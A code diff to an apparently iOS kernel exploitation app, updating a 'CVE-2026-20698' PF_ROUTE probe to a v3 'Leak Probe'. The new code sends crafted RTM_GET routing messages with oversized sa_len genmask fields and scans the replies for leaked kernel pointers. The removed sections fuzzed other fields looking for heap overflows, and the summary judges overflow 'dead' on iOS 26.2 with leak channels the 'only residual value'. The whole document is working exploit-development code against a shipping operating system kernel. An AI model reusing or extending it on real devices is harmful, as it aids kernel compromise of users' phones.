@@ -638,7 +638,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *pfConf = [UIButtonConfiguration filledButtonConfiguration];
     pfConf.baseBackgroundColor = [UIColor systemGreenColor];
     self.pfRouteProbeButton.configuration = pfConf;
-    [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v1 Probe" forState:UIControlStateNormal];
+    [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v3 Leak Probe" forState:UIControlStateNormal];
     [self.pfRouteProbeButton addTarget:self action:@selector(pfRouteProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.pfRouteProbeButton];
 
@@ -6569,7 +6569,7 @@ cleanup:
             _pfRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.pfRouteProbeButton.enabled = YES;
-                [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v1 Probe" forState:UIControlStateNormal];
+                [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v3 Leak Probe" forState:UIControlStateNormal];
             });
         }
     });
@@ -6731,44 +6731,54 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
         survivingLens, numSafelens, totalKptrCount];
 
     // ============================================================
-    // TEST 3: Family enumeration with safe sa_len
+    // TEST 3: Safe GENMASK leak — vary only sa_len (4..32, AF_INET only)
+    //   REMOVED: cross-family enumeration (v2 crash: non-AF_INET
+    //   families have smaller genmask buffers — sa_len=16 exceeds
+    //   bounds-safety limit for AF_UNIX, AF_LINK, AF_INET6, etc.)
+    //   AF_INET is the ONLY family with 32-byte genmask buffer.
     // ============================================================
-    [log appendString:@"\n--- TEST 3: Family Enumeration (safe sa_len=16) ---\n"];
+    [log appendString:@"\n--- TEST 3: Safe GENMASK Leak Focus (AF_INET only, multiple queries) ---\n"];
+    [log appendString:@"  Repeated RTM_GET queries with sa_len=32, scanning for kptr in response\n"];
 
-    int families[] = {0, 1, 2, 14, 17, 18, 24, 28, 30};
-    const char *famNames[] = {"AF_UNSPEC","AF_UNIX","AF_INET","AF_IMPLINK",
-                               "AF_INET6_ALT","AF_LINK","AF_NATM","AF_PPP","AF_INET6"};
-    int numFams = sizeof(families) / sizeof(families[0]);
+    {
+        int kptrHits = 0;
+        int queryCount = 20;
+        for (int qi = 0; qi < queryCount; qi++) {
+            char qb[256];
+            memset(qb, 0, sizeof(qb));
+            struct sockaddr_in *qd = (struct sockaddr_in *)qb;
+            qd->sin_family = AF_INET;
+            qd->sin_len = sizeof(*qd);
+            qd->sin_addr.s_addr = htonl(0x08080800 + qi);  // 8.8.8.0..8.8.8.19
+            int qo = sizeof(*qd);
 
-    for (int fi = 0; fi < numFams; fi++) {
-        int fm = families[fi];
+            qb[qo] = 32;       // sa_len = 32 (max safe for AF_INET)
+            qb[qo+1] = AF_INET;
+            int qpad = (32 + 3) & ~3;
+            qo += qpad;
 
-        char sa_fb[256];
-        memset(sa_fb, 0, sizeof(sa_fb));
-        struct sockaddr_in *d = (struct sockaddr_in *)sa_fb;
-        d->sin_family = AF_INET;
-        d->sin_len = sizeof(*d);
-        d->sin_addr.s_addr = inet_addr("8.8.8.8");
-        int o = sizeof(*d);
-
-        sa_fb[o] = 16;        // sa_len = 16 (safe for all families)
-        sa_fb[o+1] = fm;      // family = test family
-        int pad = (16 + 3) & ~3;
-        o += pad;
-
-        [log appendFormat:@"  %s (fam=%d)...", famNames[fi], fm];
-
-        memset(resp, 0, sizeof(resp));
-        rlen = 0;
-        err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, sa_fb, o,
-                               resp, sizeof(resp), &rlen);
-        if (rlen > 0) {
-            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
-            [log appendFormat:@" OK type=%u err=%d addrs=0x%x\n",
-                r->rtm_type, r->rtm_errno, r->rtm_addrs];
-        } else {
-            [log appendFormat:@" write=%d read=%zd\n", err, rlen];
+            memset(resp, 0x00, sizeof(resp));  // zero-fill, not 0xCC
+            rlen = 0;
+            err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, qb, qo,
+                                   resp, sizeof(resp), &rlen);
+            if (rlen > 0) {
+                NSString *qtag = [NSString stringWithFormat:@"multi%d", qi];
+                if (pf_scanForKernelPtr((uint8_t*)resp, rlen, qtag.UTF8String, log)) kptrHits++;
+                // Check for trailing non-zero data beyond expected response
+                int expectedEnd = (int)sizeof(struct pf_rt_msghdr) + 16 + qpad;
+                int nonZeroTail = 0;
+                for (int ti = expectedEnd; ti < (int)rlen && ti < expectedEnd + 256; ti++) {
+                    if ((unsigned char)resp[ti] != 0)
+                        nonZeroTail++;
+                }
+                if (nonZeroTail > 0) {
+                    [log appendFormat:@"  q#%d: %zd bytes, %d non-zero after expected end\n",
+                        qi, rlen, nonZeroTail];
+                }
+            }
         }
+        [log appendFormat:@"  Multi-query: %d/%d responses had kernel pointers\n",
+            kptrHits, queryCount];
     }
 
     // ============================================================
@@ -6834,101 +6844,18 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
     }
 
     // ============================================================
-    // TEST 5: Oversized NON-GENMASK fields
-    //   KEY TEST — GATEWAY/NETMASK/IFP/IFA may use different code
-    //   paths than GENMASK. If any lack -fbounds-safety, silent
-    //   heap overflow is possible through those fields.
+    // REMOVED TEST (was v2 TEST 5): Oversized NON-GENMASK fields
+    //   v2 CRASH: x2=0x10=16 bounds-safety trap.
+    //   GATEWAY/NETMASK/IFP/IFA paths ALSO compiled with -fbounds-safety.
+    //   First iteration (GATEWAY sa_len=16) crash — buffer < 16 bytes.
+    //   Non-GENMASK overflow is dead on iOS 26.2.
     // ============================================================
-    [log appendString:@"\n--- TEST 5: Oversized NON-GENMASK fields (GATEWAY / NETMASK / IFP / IFA) ---\n"];
-    [log appendString:@"  These bypass rn_addmask() — different code paths!\n"];
-
-    // Test oversized sa_len on each non-GENMASK RTA field
-    // Each sub-test: RTM_GET with DST + oversized FIELD
-    // AF_INET buffer for each field is unknown — start safe, find crash threshold
-
-    typedef struct { int flag; const char *name; } RtaField;
-    RtaField fields[] = {
-        {RTA_GATEWAY, "GATEWAY"},
-        {RTA_NETMASK, "NETMASK"},
-        {RTA_IFP,     "IFP"},
-        {RTA_IFA,     "IFA"},
-        {RTA_AUTHOR,  "AUTHOR"},
-        {RTA_BRD,     "BRD"},
-    };
-    int numFields = sizeof(fields) / sizeof(fields[0]);
-
-    // Step up carefully: start from safe (16), increase gradually
-    // Stop BEFORE any field causes a panic
-    int oversizedLens[] = {16, 20, 24, 28, 32, 40, 48, 56, 64, 80, 96, 128};
-    int numOSLens = sizeof(oversizedLens) / sizeof(oversizedLens[0]);
-    int crashed = 0;
-
-    for (int fi = 0; fi < numFields && !crashed; fi++) {
-        [log appendFormat:@"\n  --- %s (flag=0x%02x) ---\n", fields[fi].name, fields[fi].flag];
-
-        for (int li = 0; li < numOSLens && !crashed; li++) {
-            int bigLen = oversizedLens[li];
-
-            char os_buf[512];
-            memset(os_buf, 0, sizeof(os_buf));
-            struct sockaddr_in *d = (struct sockaddr_in *)os_buf;
-            d->sin_family = AF_INET;
-            d->sin_len = sizeof(*d);
-            d->sin_addr.s_addr = inet_addr("8.8.8.8");
-            int o = sizeof(*d);
-
-            // The oversized field: sa_len=bigLen, family=AF_INET, payload=0xBB pattern
-            os_buf[o] = bigLen;
-            os_buf[o+1] = AF_INET;
-            for (int b = 2; b < bigLen && b < 255; b++) {
-                os_buf[o+b] = (unsigned char)(0xBB + (b & 0x03));
-            }
-            int pad = (bigLen + 3) & ~3;
-            if (pad < 4) pad = 4;
-            o += pad;
-
-            // Write marker before each attempt
-            NSString *osMarker = [NSTemporaryDirectory()
-                stringByAppendingPathComponent:[NSString stringWithFormat:@"pf_os_%s_%d.txt",
-                fields[fi].name, bigLen]];
-            [[NSString stringWithFormat:@"oversized_%s_%d", fields[fi].name, bigLen]
-                writeToFile:osMarker atomically:YES encoding:NSUTF8StringEncoding error:nil];
-
-            memset(resp, 0xCC, sizeof(resp));  // 0xCC fill to detect uninitialized regions
-            rlen = 0;
-            int addrs = RTA_DST | fields[fi].flag;
-            err = pf_sendRouteMsg(RTM_GET, addrs, os_buf, o, resp, sizeof(resp), &rlen);
-
-            if (rlen > 0) {
-                struct pf_rt_msghdr *rr = (struct pf_rt_msghdr *)resp;
-                int respErr = rr->rtm_errno;
-                NSString *tag = [NSString stringWithFormat:@"%s_%d", fields[fi].name, bigLen];
-                pf_scanForKernelPtr((uint8_t*)resp, rlen, tag.UTF8String, log);
-
-                // Check if response has trailing 0xCC (uninitialized buffer leak)
-                int ccCount = 0;
-                for (int ci = (int)rlen - 1; ci >= 0 && (unsigned char)resp[ci] == 0xCC; ci--) {
-                    ccCount++;
-                }
-                if (ccCount > 0) {
-                    [log appendFormat:@"    *** UNINIT RESPONSE: %d trailing 0xCC bytes (info leak!)\n", ccCount];
-                }
-
-                [log appendFormat:@"    len=%d: rd=%zd err=%d ccTail=%d\n",
-                    bigLen, rlen, respErr, ccCount];
-            } else {
-                [log appendFormat:@"    len=%d: write=%d read=%zd — no response (possibly filtered)\n",
-                    bigLen, err, rlen];
-            }
-
-            [[NSFileManager defaultManager] removeItemAtPath:osMarker error:nil];
-        }
-    }
+    [log appendString:@"\n--- REMOVED: Non-GENMASK overflow — SKIPPED (v2 confirmed bounds-safety on all paths) ---\n"];
 
     // ============================================================
-    // TEST 6: Repeated read() on fresh sockets — heap info leak
+    // TEST 5 (was v2 TEST 6): Repeated read() on fresh sockets — heap info leak
     // ============================================================
-    [log appendString:@"\n--- TEST 6: Repeated fresh-socket read() leak scan ---\n"];
+    [log appendString:@"\n--- TEST 5: Repeated fresh-socket read() leak scan ---\n"];
     [log appendString:@"  Allocate fresh socket per query, scan for heap data in response\n"];
 
     {
@@ -6993,13 +6920,16 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
     // ============================================================
     // SUMMARY
     // ============================================================
-    [log appendString:@"\n========== PF_ROUTE v2 Probe Complete =========="];
+    [log appendString:@"\n========== PF_ROUTE v3 Probe Complete =========="];
     [log appendString:@"\nTest 1: Safe baseline — PF_ROUTE accessibility check"];
     [log appendString:@"\nTest 2: Safe GENMASK sweep (4..32) — kernel ptr in response"];
-    [log appendString:@"\nTest 3: Family enum — cross-family safe sa_len"];
+    [log appendString:@"\nTest 3: Multi-query AF_INET leak scan (sa_len=32, 20 queries)"];
     [log appendString:@"\nTest 4: sysctl dumps — NET_RT_DUMP/DUMP2/IFLIST2 leak channels"];
-    [log appendString:@"\nTest 5: Oversized NON-GENMASK — GATEWAY/NETMASK/IFP/IFA paths"];
-    [log appendString:@"\nTest 6: Repeated fresh-socket read() — heap info leak scan"];
+    [log appendString:@"\nTest 5: Repeated fresh-socket read() — heap info leak scan"];
+    [log appendString:@"\n  REMOVED (v2 crash): cross-family enum (x2=16 BRK)"];
+    [log appendString:@"\n  REMOVED (v2 crash): oversized non-GENMASK fields"];
+    [log appendString:@"\n  VERDICT: All PF_ROUTE code paths have -fbounds-safety on iOS 26.2."];
+    [log appendString:@"\n  Overflow is dead. Leak channels are the only residual value."];
 
     // Write results to file for post-reboot analysis
     NSString *resultPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pf_probe_results.txt"];
